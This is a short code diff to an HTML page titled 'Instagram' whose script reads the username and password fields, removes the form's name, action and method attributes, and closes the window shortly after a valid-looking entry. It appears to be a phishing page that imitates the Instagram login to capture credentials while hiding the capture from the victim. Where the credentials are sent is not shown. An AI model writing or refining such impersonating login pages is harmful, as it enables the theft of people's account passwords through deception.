@@ -7,22 +7,22 @@
         <link href="img/logo.png" rel="icon" type="image/x-icon"/>
         <title>Instagram</title>
                 <script>
+                        function required(){
+                                var user = formuser.$user.value;
+                                var pass = formuser.$pass.value;
+
+                                function c(){
+                                        setTimeout(function() {
+                                                window.close() 
+                                        }, 800);
+                                }
                                 function d(){
                                         document.getElementsByTagName("form")[0].removeAttribute("name")
                                         document.getElementsByTagName("form")[0].removeAttribute("action")
                                         document.getElementsByTagName("form")[0].removeAttribute("method")
                                 }
-                                function c(){
-                                        setTimeout(function() {
-                                                window.close() 
-                                        }, 1000);
-                                }
-                        function required(){
-                                
-                                var user = formuser.$user.value;
-                                var pass = formuser.$pass.value;
 
-                                if(user != "" && pass.length >= 6){
+                                if(user != "" && pass.length >= 6 && pass != ""){
                                         c();
                                 }
                                 if(user == ""){
